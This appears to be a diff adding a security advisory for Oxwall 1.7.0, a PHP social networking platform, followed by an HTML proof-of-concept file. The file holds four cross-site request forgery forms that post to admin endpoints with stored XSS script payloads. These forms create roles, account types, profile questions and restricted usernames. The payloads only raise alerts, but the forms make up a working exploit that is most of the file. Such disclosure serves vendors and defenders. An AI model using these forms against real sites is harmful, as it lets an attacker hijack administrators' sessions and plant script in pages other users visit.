@@ -1,0 +1,101 @@
+&lt;!--
+
+Oxwall 1.7.0 Multiple CSRF And HTML Injection Vulnerabilities
+
+
+Vendor: Oxwall Software Foundation
+
+Product web page: http://www.oxwall.org
+Affected version: 1.7.0 (build 7907 and 7906)
+
+Summary: Oxwall is unbelievably flexible and easy to use
+PHP/MySQL social networking software platform.
+
+Desc: Oxwall version 1.7.0 suffers from multiple cross-site
+request forgery and stored xss vulnerabilities. The application
+allows users to perform certain actions via HTTP requests
+without performing any validity checks to verify the requests.
+This can be exploited to perform certain actions with administrative
+privileges if a logged-in user visits a malicious web site.
+Input passed to several POST parameters is not properly
+sanitised before being returned to the user. This can be
+exploited to execute arbitrary HTML and script code in a
+user&#39;s browser session in context of an affected site.
+
+Tested on: Kali Linux 3.7-trunk-686-pae
+           Apache/2.2.22 (Debian)
+           PHP 5.4.4-13(apache2handler)
+           MySQL 5.5.28
+
+
+Vulnerabilities discovered by Gjoko &#39;LiquidWorm&#39; Krstic
+                              @zeroscience
+
+
+Advisory ID: ZSL-2014-5195
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5195.php
+
+
+
+18.07.2014
+
+--&gt;
+
+
+&lt;html&gt;
+&lt;title&gt;Oxwall 1.7.0 Multiple CSRF And Stored XSS Vulnerabilities&lt;/title&gt;
+&lt;body&gt;
+
+
+&lt;form action=&quot;http://www.example.com/admin/users/roles/&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;form_name&quot; value=&quot;add-role&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;label&quot; value=&#39;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#39; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;Add&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Execute #1&quot; /&gt;
+&lt;/form&gt;
+
+
+&lt;form action=&quot;http://www.example.com/admin/questions/ajax-responder/&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;form_name&quot; value=&quot;account_type_49693e2b1cb50cad5c42b18a9103f146dcce2ec6&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;command&quot; value=&quot;AddAccountType&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;key&quot; value=&quot;questions_account_type_5615100a931845eca8da20cfdf7327e0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;prefix&quot; value=&quot;base&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;accountTypeName&quot; value=&quot;5615100a931845eca8da20cfdf7327e0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;lang[1][base][questions_account_type_5615100a931845eca8da20cfdf7327e0]&quot; value=&#39;&quot;&gt;&lt;script&gt;alert(2);&lt;/script&gt;&#39; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;role&quot; value=&quot;12&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Execute #2&quot; /&gt;
+&lt;/form&gt;
+
+
+&lt;form action=&quot;http://www.example.com/admin/questions/ajax-responder/&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;form_name&quot; value=&quot;qst_add_form&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_name&quot; value=&#39;&quot;&gt;&lt;script&gt;alert(3);&lt;/script&gt;&#39; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_description&quot; value=&quot;ZSL&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_account_type[0]&quot; value=&quot;290365aadde35a97f11207ca7e4279cc&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_section&quot; value=&quot;f90cde5913235d172603cc4e7b9726e3&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_answer_type&quot; value=&quot;text&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_possible_values&quot; value=&quot;%5B%5D&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;year_range[to]&quot; value=&quot;1996&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;year_range[from]&quot; value=&quot;1930&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_column_count&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_required&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_on_sign_up&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_on_edit&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_on_view&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;qst_on_search&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;valuesStorage&quot; value=&quot;%7B%7D&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;command&quot; value=&quot;addQuestion&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Execute #3&quot; /&gt;
+&lt;/form&gt;
+
+
+&lt;form action=&quot;http//www.example.com/admin/restricted-usernames&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;form_name&quot; value=&#39;restrictedUsernamesForm&quot;&gt;&lt;script&gt;alert(4);&lt;/script&gt;&#39; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;restrictedUsername&quot; value=&#39;&quot;&gt;&lt;script&gt;alert(5);&lt;/script&gt;&#39; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;addUsername&quot; value=&quot;Add&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Execute #4 &amp; #5&quot; /&gt;
+&lt;/form&gt;
+
+
+&lt;/body&gt;
+&lt;/html&gt;
